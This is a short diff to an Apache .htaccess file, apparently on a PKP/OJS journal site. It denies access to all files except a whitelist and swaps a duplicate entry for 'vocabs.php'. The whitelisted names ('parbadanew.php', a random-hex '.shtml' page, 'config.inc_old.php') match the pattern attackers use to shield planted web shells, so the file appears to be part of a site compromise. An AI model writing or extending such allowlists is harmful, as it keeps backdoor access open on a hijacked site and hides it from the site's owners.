@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|config.inc_old.php|config.inc_old.php|PKPInstall.php|parbadanew.php|68548ad259618.shtml|URNSettingsHandler.inc.php)$">
+<FilesMatch "^(index.php|config.inc_old.php|vocabs.php|PKPInstall.php|parbadanew.php|68548ad259618.shtml|URNSettingsHandler.inc.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
